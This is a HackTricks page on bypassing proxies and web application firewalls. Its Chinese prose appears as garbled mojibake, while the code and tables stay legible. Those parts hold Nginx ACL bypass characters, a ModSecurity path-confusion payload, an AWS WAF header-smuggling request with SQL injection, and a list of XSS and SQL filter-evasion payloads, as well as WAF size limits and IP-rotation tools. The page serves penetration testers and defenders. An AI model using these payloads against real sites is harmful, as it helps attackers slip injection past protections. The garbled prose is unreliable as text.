# Proxy / WAF Protections Bypass

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## é€šè¿‡è·¯å¾„åæ“ä½œç»•è¿‡ Nginx ACL è§„åˆ™ <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

æŠ€æœ¯ [æ¥è‡ªè¿™é¡¹ç ”ç©¶](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)ã€‚

Nginx è§„åˆ™ç¤ºä¾‹ï¼š
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
ä¸ºäº†é˜²æ­¢ç»•è¿‡ï¼ŒNginx åœ¨æ£€æŸ¥è·¯å¾„ä¹‹å‰æ‰§è¡Œè·¯å¾„è§„èŒƒåŒ–ã€‚ç„¶è€Œï¼Œå¦‚æœåç«¯æœåŠ¡å™¨æ‰§è¡Œä¸åŒçš„è§„èŒƒåŒ–ï¼ˆç§»é™¤ Nginx ä¸ç§»é™¤çš„å­—ç¬¦ï¼‰ï¼Œåˆ™å¯èƒ½ç»•è¿‡æ­¤é˜²å¾¡ã€‚

### **NodeJS - Express**

| Nginx ç‰ˆæœ¬ | **Node.js ç»•è¿‡å­—ç¬¦** |
| --------- | --------------------- |
| 1.22.0    | `\xA0`                |
| 1.21.6    | `\xA0`                |
| 1.20.2    | `\xA0`, `\x09`, `\x0C` |
| 1.18.0    | `\xA0`, `\x09`, `\x0C` |
| 1.16.1    | `\xA0`, `\x09`, `\x0C` |

### **Flask**

| Nginx ç‰ˆæœ¬ | **Flask ç»•è¿‡å­—ç¬¦**                                      |
| --------- | ------------------------------------------------------ |
| 1.22.0    | `\x85`, `\xA0`                                         |
| 1.21.6    | `\x85`, `\xA0`                                         |
| 1.20.2    | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0    | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1    | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx ç‰ˆæœ¬ | **Spring Boot ç»•è¿‡å­—ç¬¦** |
| --------- | ------------------------- |
| 1.22.0    | `;`                       |
| 1.21.6    | `;`                       |
| 1.20.2    | `\x09`, `;`               |
| 1.18.0    | `\x09`, `;`               |
| 1.16.1    | `\x09`, `;`               |

### **PHP-FPM**

Nginx FPM é…ç½®ï¼š
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx è¢«é…ç½®ä¸ºé˜»æ­¢å¯¹ `/admin.php` çš„è®¿é—®ï¼Œä½†å¯ä»¥é€šè¿‡è®¿é—® `/admin.php/index.php` æ¥ç»•è¿‡æ­¤é™åˆ¶ã€‚

### å¦‚ä½•é˜²æ­¢
```plaintext
location ~* ^/admin {
deny all;
}
```
## ç»•è¿‡ Mod Security è§„åˆ™ <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### è·¯å¾„æ··æ·†

[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) è§£é‡Šäº† ModSecurity v3ï¼ˆç›´åˆ° 3.0.12ï¼‰**ä¸æ­£ç¡®åœ°å®ç°äº† `REQUEST_FILENAME`** å˜é‡ï¼Œè¯¥å˜é‡åº”è¯¥åŒ…å«è®¿é—®çš„è·¯å¾„ï¼ˆç›´åˆ°å‚æ•°å¼€å§‹ï¼‰ã€‚è¿™æ˜¯å› ä¸ºå®ƒæ‰§è¡Œäº† URL è§£ç ä»¥è·å–è·¯å¾„ã€‚\
å› æ­¤ï¼Œåƒ `http://example.com/foo%3f';alert(1);foo=` è¿™æ ·çš„è¯·æ±‚åœ¨ mod security ä¸­å°†è®¤ä¸ºè·¯å¾„åªæ˜¯ `/foo`ï¼Œå› ä¸º `%3f` è¢«è½¬æ¢ä¸º `?`ï¼Œç»“æŸäº† URL è·¯å¾„ï¼Œä½†å®é™…ä¸ŠæœåŠ¡å™¨æ¥æ”¶åˆ°çš„è·¯å¾„å°†æ˜¯ `/foo%3f';alert(1);foo=`ã€‚

å˜é‡ `REQUEST_BASENAME` å’Œ `PATH_INFO` ä¹Ÿå—åˆ°æ­¤é”™è¯¯çš„å½±å“ã€‚

åœ¨ Mod Security çš„ç‰ˆæœ¬ 2 ä¸­å‘ç”Ÿäº†ç±»ä¼¼çš„æƒ…å†µï¼Œå…è®¸ç»•è¿‡ä¸€ç§ä¿æŠ¤ï¼Œè¯¥ä¿æŠ¤é˜»æ­¢ç”¨æˆ·è®¿é—®ä¸å¤‡ä»½æ–‡ä»¶ç›¸å…³çš„ç‰¹å®šæ‰©å±•åçš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ `.bak`ï¼‰ï¼Œåªéœ€é€šè¿‡å‘é€ç‚¹ URL ç¼–ç ä¸º `%2e`ï¼Œä¾‹å¦‚ï¼š`https://example.com/backup%2ebak`ã€‚

## ç»•è¿‡ AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### æ ¼å¼é”™è¯¯çš„å¤´éƒ¨

[è¿™é¡¹ç ”ç©¶](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) æåˆ°å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ªâ€œæ ¼å¼é”™è¯¯â€çš„å¤´éƒ¨æ¥ç»•è¿‡åº”ç”¨äº HTTP å¤´éƒ¨çš„ AWS WAF è§„åˆ™ï¼Œè¯¥å¤´éƒ¨æœªè¢« AWS æ­£ç¡®è§£æï¼Œä½†è¢«åç«¯æœåŠ¡å™¨è§£æã€‚

ä¾‹å¦‚ï¼Œå‘é€ä»¥ä¸‹è¯·æ±‚ï¼Œåœ¨å¤´éƒ¨ X-Query ä¸­åŒ…å« SQL æ³¨å…¥ï¼š
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
å¯ä»¥ç»•è¿‡AWS WAFï¼Œå› ä¸ºå®ƒæ— æ³•ç†è§£ä¸‹ä¸€è¡Œæ˜¯å¤´éƒ¨å€¼çš„ä¸€éƒ¨åˆ†ï¼Œè€ŒNODEJSæœåŠ¡å™¨å¯ä»¥ï¼ˆè¿™ä¸ªé—®é¢˜å·²è¢«ä¿®å¤ï¼‰ã€‚

## é€šç”¨WAFç»•è¿‡

### è¯·æ±‚å¤§å°é™åˆ¶

é€šå¸¸ï¼ŒWAFå¯¹è¯·æ±‚çš„é•¿åº¦æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œå¦‚æœPOST/PUT/PATCHè¯·æ±‚è¶…è¿‡è¯¥é™åˆ¶ï¼ŒWAFå°†ä¸ä¼šæ£€æŸ¥è¯¥è¯·æ±‚ã€‚

* å¯¹äºAWS WAFï¼Œæ‚¨å¯ä»¥[**æŸ¥çœ‹æ–‡æ¡£**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>å¯ä»¥æ£€æŸ¥çš„åº”ç”¨è´Ÿè½½å‡è¡¡å™¨å’ŒAWS AppSyncä¿æŠ¤çš„Webè¯·æ±‚ä½“çš„æœ€å¤§å¤§å°</td><td>8 KB</td></tr><tr><td>å¯ä»¥æ£€æŸ¥çš„CloudFrontã€API Gatewayã€Amazon Cognitoã€App Runnerå’ŒVerified Accessä¿æŠ¤çš„Webè¯·æ±‚ä½“çš„æœ€å¤§å¤§å°**</td><td>64 KB</td></tr></tbody></table>

* æ¥è‡ª[**Azureæ–‡æ¡£**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

è¾ƒæ—§çš„Webåº”ç”¨é˜²ç«å¢™ä½¿ç”¨æ ¸å¿ƒè§„åˆ™é›†3.1ï¼ˆæˆ–æ›´ä½ç‰ˆæœ¬ï¼‰å…è®¸å¤§äº**128 KB**çš„æ¶ˆæ¯ï¼Œé€šè¿‡å…³é—­è¯·æ±‚ä½“æ£€æŸ¥ï¼Œä½†è¿™äº›æ¶ˆæ¯ä¸ä¼šè¢«æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚å¯¹äºè¾ƒæ–°ç‰ˆæœ¬ï¼ˆæ ¸å¿ƒè§„åˆ™é›†3.2æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰ï¼Œå¯ä»¥é€šè¿‡ç¦ç”¨æœ€å¤§è¯·æ±‚ä½“é™åˆ¶æ¥å®ç°ã€‚å½“è¯·æ±‚è¶…è¿‡å¤§å°é™åˆ¶æ—¶ï¼š

å¦‚æœ**é¢„é˜²æ¨¡å¼**ï¼šè®°å½•å¹¶é˜»æ­¢è¯·æ±‚ã€‚\
å¦‚æœ**æ£€æµ‹æ¨¡å¼**ï¼šæ£€æŸ¥åˆ°é™åˆ¶ï¼Œå¿½ç•¥å…¶ä½™éƒ¨åˆ†ï¼Œå¹¶åœ¨`Content-Length`è¶…è¿‡é™åˆ¶æ—¶è®°å½•ã€‚

* æ¥è‡ª[**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

é»˜è®¤æƒ…å†µä¸‹ï¼ŒWAFä»…æ£€æŸ¥è¯·æ±‚çš„å‰8KBã€‚é€šè¿‡æ·»åŠ é«˜çº§å…ƒæ•°æ®ï¼Œå¯ä»¥å°†é™åˆ¶å¢åŠ åˆ°128KBã€‚

* æ¥è‡ª[**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

æœ€å¤š128KBã€‚

### æ··æ·† <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode å…¼å®¹æ€§ <a href="#unicode-compatability" id="unicode-compatability"></a>

æ ¹æ® Unicode è§„èŒƒåŒ–çš„å®ç°ï¼ˆæ›´å¤šä¿¡æ¯ [è¿™é‡Œ](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)ï¼‰ï¼Œå…±äº« Unicode å…¼å®¹æ€§çš„å­—ç¬¦å¯èƒ½èƒ½å¤Ÿç»•è¿‡ WAF å¹¶ä½œä¸ºé¢„æœŸçš„æœ‰æ•ˆè´Ÿè½½æ‰§è¡Œã€‚å…¼å®¹å­—ç¬¦å¯ä»¥åœ¨ [è¿™é‡Œ](https://www.compart.com/en/unicode) æ‰¾åˆ°ã€‚

#### ç¤ºä¾‹ <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): ç”Ÿæˆä¸€ä¸ªAPIç½‘å…³URLä»¥ä¾›ffufä½¿ç”¨
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): ç±»ä¼¼äºfireprox
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): ä½¿ç”¨APIç½‘å…³IPçš„Burp Suiteæ’ä»¶
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): æ ¹æ®è¾“å…¥æ–‡ä»¶å¤§å°å’Œæ‹†åˆ†å› å­åŠ¨æ€ç¡®å®šæ¿€æ´»çš„å®¹å™¨å®ä¾‹æ•°é‡ï¼Œè¾“å…¥è¢«æ‹†åˆ†ä¸ºå¤šä¸ªå—ä»¥è¿›è¡Œå¹¶è¡Œæ‰§è¡Œï¼Œä¾‹å¦‚100ä¸ªå®ä¾‹å¤„ç†æ¥è‡ª10,000è¡Œè¾“å…¥æ–‡ä»¶çš„100ä¸ªå—ï¼Œæ‹†åˆ†å› å­ä¸º100è¡Œã€‚

### Regex Bypasses

å¯ä»¥ä½¿ç”¨ä¸åŒçš„æŠ€æœ¯æ¥ç»•è¿‡é˜²ç«å¢™ä¸Šçš„æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨ã€‚ç¤ºä¾‹åŒ…æ‹¬äº¤æ›¿å¤§å°å†™ã€æ·»åŠ æ¢è¡Œç¬¦å’Œç¼–ç æœ‰æ•ˆè´Ÿè½½ã€‚å„ç§ç»•è¿‡çš„èµ„æºå¯ä»¥åœ¨[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)å’Œ[OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html)æ‰¾åˆ°ã€‚ä»¥ä¸‹ç¤ºä¾‹æ¥è‡ª[è¿™ç¯‡æ–‡ç« ](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)ã€‚
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## å·¥å…·

* [**nowafpls**](https://github.com/assetnote/nowafpls): Burp æ’ä»¶ï¼Œé€šè¿‡é•¿åº¦å‘è¯·æ±‚æ·»åŠ åƒåœ¾æ•°æ®ä»¥ç»•è¿‡ WAF

## å‚è€ƒèµ„æ–™

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
